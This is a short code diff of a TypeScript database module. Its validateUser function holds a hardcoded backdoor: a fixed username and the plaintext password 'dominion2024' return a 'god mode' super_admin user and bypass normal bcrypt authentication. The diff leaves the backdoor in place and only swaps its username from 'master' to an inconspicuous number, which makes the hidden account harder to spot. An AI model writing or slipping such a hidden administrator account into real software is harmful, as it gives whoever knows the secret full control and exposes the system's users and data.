@@ -1,3 +1,4 @@
+
 import bcrypt from 'bcrypt';
 import mongoose, { Schema, Model } from 'mongoose';
 import { User, BotSettings, PromptArchetype, GlobalMetrics, GlobalTelemetry, Conversation, IntendedUse, LogEntry, Testimonial } from './types.js';
@@ -153,7 +154,7 @@ class Database {
   async validateUser(username: string, password: string) {
     if (!this.isInitialized) await this.init();
     
-    if (username === 'master' && password === 'dominion2024') {
+    if (username === '234589' && password === 'dominion2024') {
         return this.getGodModeUser();
     }
 
@@ -173,7 +174,7 @@ class Database {
   private getGodModeUser(): User {
       return {
         id: 'master-god-node',
-        username: 'master',
+        username: '234589',
         role: 'super_admin',
         plan_type: 'pro',
         plan_status: 'active',
